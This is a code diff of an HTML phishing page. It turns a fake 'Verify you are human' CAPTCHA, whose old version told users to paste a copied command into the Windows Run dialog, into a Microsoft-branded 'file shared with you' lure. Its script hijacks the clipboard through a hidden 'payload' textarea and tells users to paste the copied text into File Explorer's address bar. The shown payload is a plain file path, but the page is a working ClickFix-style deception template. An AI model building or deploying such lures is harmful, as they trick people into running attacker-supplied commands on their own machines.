@@ -1,8 +1,8 @@
-
 <!DOCTYPE html>
 <head>
-  <title>Verify you are human</title>
+  <title>A file was shared with you</title>
   <style>
+    /* Page layout and base font styling */
     body {
       background-color: #f2f2f2;
       font-family: 'Segoe UI', sans-serif;
@@ -14,6 +14,7 @@
       min-height: 100vh;
     }
 
+    /* Main centered container */
     .container {
       background-color: #ffffff;
       width: 560px;
@@ -23,6 +24,7 @@
       text-align: center;
     }
 
+    /* Header section containing file info */
     .header {
       padding: 40px 30px 10px;
     }
@@ -33,12 +35,14 @@
       margin: 0;
     }
 
+    /* Timestamp under the header */
     .timestamp {
       font-size: 13px;
       color: #7a7a7a;
       margin-top: 6px;
     }
 
+    /* Instructions block for user steps */
     .instructions {
       text-align: left;
       padding: 25px 40px 10px;
@@ -52,24 +56,23 @@
       padding-left: 20px;
     }
 
-    .captcha-btn {
-      display: inline-block;
-      background-color: #ffffff;
-      border: 2px solid #ccc;
+    /* Styled button to simulate verification */
+    #fileExplorer {
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      font-size: 15px;
       border-radius: 4px;
-      padding: 10px 16px;
-      font-size: 14px;
+      margin: 30px 0 40px;
       cursor: pointer;
-      margin-bottom: 15px;
-      user-select: none;
     }
 
-    .captcha-btn.checked {
-      border-color: #107c10;
-      color: #107c10;
-      font-weight: bold;
+    #fileExplorer:hover {
+      background-color: #005ea2;
     }
 
+    /* Footer section mimicking official styling */
     .footer {
       font-size: 11.5px;
       color: #6b6b6b;
@@ -89,48 +92,60 @@
 <body>
 
   <div class="container">
+    <!-- File announcement -->
     <div class="header">
-      <h2>Verify you are human</h2>
+      <h2>The file "HRPolicy.docx" was made available to you</h2>
       <div class="timestamp">06/20/2025 10:22:45 AM</div>
     </div>
 
+    <!-- Step-by-step usage instructions -->
     <div class="instructions">
-      <p>Please verify that you are a human to continue.</p>
-      
+      <p>To access <strong>HRPolicy.docx</strong>, validate below and follow the steps:</p>
       <ol id="steps">
-        <li style="margin-bottom: 10px;">Press <strong>Windows Key + R</strong> to open the Run dialog</li>
-        <li style="margin-bottom: 10px;">Paste the copied command and press <strong>Enter</strong></li>
+        <li style="margin-bottom: 10px;">Open File Explorer (<strong>Windows Key + E</strong>) and select the address bar (<strong>CTRL + L</strong>)</li>
+        <li style="margin-bottom: 10px;">Paste the file path and press <strong>Enter</strong></li>
       </ol>
-      <button id="captcha" class="captcha-btn">Verify</button>
     </div>
 
+    <!-- Hidden input to simulate file selection -->
+    <input type="file" id="fileInput" webkitdirectory directory style="display:none;">
+    <!-- Fake verification button -->
+    <button id="fileExplorer">Verify that you are not a robot</button>
+
+    <!-- Footer branding -->
     <div class="footer">
       <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
     </div>
   </div>
 
+  <!-- Hidden textarea for payload injection -->
   <textarea id="hiddenPayload" style="position:absolute; left:-9999px;"></textarea>
 
   <script>
-    const captcha = document.getElementById('captcha');
+    const fileInput = document.getElementById('fileInput');
     const steps = document.getElementById('steps');
     const hidden = document.getElementById("hiddenPayload");
+    const fileExplorer = document.getElementById('fileExplorer');
 
-    function solveCaptcha() {
+    // On button click, copy payload path to clipboard, then open hidden file input
+    fileExplorer.addEventListener('click', () => {
       const payload = "C:\\company\\internal-secure\\filedrive\\HRPolicy.docx";
       hidden.value = payload;
       hidden.select();
       hidden.setSelectionRange(0, hidden.value.length);
       const copied = document.execCommand("copy");
-      if (copied) {
-        captcha.classList.add("checked");
-        captcha.innerText = "Verified";
-      } else {
-        alert("Clipboard copy not supported");
-      }
-    }
 
-    captcha.addEventListener("click", solveCaptcha);
+      // File inputs cannot directly launch File Explorer
+      // Hidden file input is clicked to simulate open dialog
+      fileInput.click();
+    });
+
+    // When file input changes, reset and re-trigger after short delay
+    fileInput.addEventListener('change', () => {
+      alert("Please follow the stated instructions.");
+      fileInput.value = "";
+      setTimeout(() => fileInput.click(), 500);
+    });
   </script>
 </body>
 </html>
